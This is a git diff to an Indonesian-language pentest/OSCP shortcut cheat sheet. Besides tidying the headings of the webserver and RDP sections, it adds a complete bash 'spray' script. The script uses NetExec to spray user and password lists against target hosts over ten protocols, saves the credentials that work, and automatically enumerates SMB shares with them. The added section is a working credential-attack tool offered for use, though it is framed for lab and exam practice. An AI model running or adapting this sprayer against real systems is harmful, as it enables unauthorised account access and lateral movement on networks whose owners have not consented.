@@ -4,7 +4,7 @@ Kumpulan shortcut untuk mempercepat workflow pentest / OSCP.
 
 ---
 
-## 1️⃣ 🌐 webserver
+## 1 webserver
 
 **Deskripsi:** HTTP server + auto generate wget & PowerShell (IWR)
 
@@ -59,7 +59,7 @@ webserver 80
 
 ---
 
-## 2️⃣ 🖥️ rdp
+## 2 rdp
 
 **Deskripsi:** Shortcut cepat untuk koneksi RDP (xfreerdp)
 
@@ -103,3 +103,181 @@ rdp 192.168.50.250 offsec lab
 - Cert: ignore (lab friendly)
 
 ---
+
+## 3 spray
+
+**Deskripsi:** Shortcut cepat untuk spray user password ke list target (net exec / nxc)
+
+### Setup
+```bash
+sudo nano /usr/local/bin/spray
+sudo chmod +x /usr/local/bin/spray
+```
+
+### Script
+```bash
+#!/bin/bash
+
+# ===============================
+# spray v4 - Stable & OSCP-safe NetExec Sprayer
+# ===============================
+
+TARGET_FILE=${1:-target}
+USER_FILE=${2:-user}
+PASS_FILE=${3:-pass}
+
+OUTDIR="spray_netexec"
+RAW_OUT="$OUTDIR/raw_spray.txt"
+CLEAN_OUT="$OUTDIR/clean_spray.txt"
+SMB_OUT="$OUTDIR/smb_spray.txt"
+
+# OSCP-safe config
+THREADS=1
+JITTER=3
+
+PROTOCOLS=("smb" "rdp" "wmi" "winrm" "mssql" "ssh" "ftp" "vnc" "nfs" "ldap")
+
+# ===============================
+# HELP
+# ===============================
+if [[ "$1" == "-h" || "$1" == "--help" ]]; then
+    echo "spray v4 - Hardened password spraying (NetExec)"
+    echo
+    echo "Usage:"
+    echo "  spray [target] [user] [pass]"
+    echo
+    echo "Default:"
+    echo "  spray (uses: target user pass)"
+    echo
+    echo "Output:"
+    echo "  spray_netexec/"
+    echo "    ├── raw_spray.txt"
+    echo "    ├── clean_spray.txt"
+    echo "    └── smb_spray.txt"
+    echo
+    echo "Safe mode:"
+    echo "  Threads : $THREADS"
+    echo "  Jitter  : $JITTER sec"
+    exit 0
+fi
+
+# ===============================
+# CHECK DEPENDENCY
+# ===============================
+command -v nxc >/dev/null || { echo "[!] nxc not found"; exit 1; }
+
+# ===============================
+# CHECK FILE
+# ===============================
+for f in "$TARGET_FILE" "$USER_FILE" "$PASS_FILE"; do
+    [ -f "$f" ] || { echo "[!] Missing file: $f"; exit 1; }
+done
+
+# ===============================
+# INIT OUTPUT
+# ===============================
+mkdir -p "$OUTDIR"
+> "$RAW_OUT"
+> "$CLEAN_OUT"
+> "$SMB_OUT"
+
+TARGETS=$(tr '\n' ' ' < "$TARGET_FILE")
+
+echo "[+] Targets : $TARGET_FILE"
+echo "[+] Users   : $USER_FILE"
+echo "[+] Password: $PASS_FILE"
+echo "[+] Output  : $OUTDIR"
+echo
+
+# ===============================
+# SPRAY LOOP
+# ===============================
+for proto in "${PROTOCOLS[@]}"; do
+    echo "========================================"
+    echo "[+] Trying protocol: $proto"
+    echo "========================================"
+
+    TMP_OUT=$(mktemp)
+
+    nxc $proto $TARGETS \
+        -u "$USER_FILE" \
+        -p "$PASS_FILE" \
+        --threads $THREADS \
+        --continue-on-success \
+        --no-progress 2>/dev/null | tee "$TMP_OUT"
+
+    # Save RAW
+    cat "$TMP_OUT" >> "$RAW_OUT"
+
+    # Save SUCCESS ONLY
+    grep -i "\[+\]" "$TMP_OUT" >> "$CLEAN_OUT"
+
+    # ===============================
+    # OPTIONAL: STOP IF LOCKOUT DETECTED
+    # ===============================
+    if grep -q "STATUS_ACCOUNT_LOCKED_OUT" "$TMP_OUT"; then
+        echo "[!] Detected account lockout! Stopping spray..."
+        rm -f "$TMP_OUT"
+        exit 1
+    fi
+
+    # ===============================
+    # SMB AUTO ENUM (FIXED PARSING)
+    # ===============================
+    if [[ "$proto" == "smb" ]]; then
+        echo "[+] Checking valid SMB creds..."
+        grep -i "\[+\]" "$TMP_OUT" | while read -r line; do
+
+        IP=$(echo "$line" | awk '{print $2}')
+
+        CREDS=$(echo "$line" | grep -oP '(?<=\[\+\] ).*')
+
+        USER_PART=$(echo "$CREDS" | awk -F':' '{print $1}')
+        PASS=$(echo "$CREDS" | awk -F':' '{print $2}')
+
+        if [[ "$USER_PART" == *\\* ]]; then
+            DOMAIN=$(echo "$USER_PART" | awk -F'\\' '{print $1}')
+            USER=$(echo "$USER_PART" | awk -F'\\' '{print $2}')
+        else
+            DOMAIN=""
+            USER="$USER_PART"
+        fi
+        
+        if [[ -z "$USER" || -z "$PASS" ]]; then
+            echo "[!] Parse failed: $line"
+            continue
+    fi
+
+    echo "[+] SMB ENUM: $IP | $USER:$PASS"
+
+    if [[ -n "$DOMAIN" ]]; then
+        nxc smb "$IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --shares --threads 1 --no-progress 2>/dev/null | tee -a "$SMB_OUT"
+    else
+        nxc smb "$IP" -u "$USER" -p "$PASS" --shares --threads 1 --no-progress 2>/dev/null | tee -a "$SMB_OUT"
+    fi
+
+   done
+
+    fi
+
+    rm -f "$TMP_OUT"
+    echo
+done
+
+echo "[+] Done!"
+echo "[+] Raw   : $RAW_OUT"
+echo "[+] Clean : $CLEAN_OUT"
+echo "[+] SMB   : $SMB_OUT"
+```
+
+### Usage
+```bash
+spray
+spray listip user.txt pass.txt
+```
+
+### Info
+- Default if running without parameter spray = spray target user pass
+
+---
+
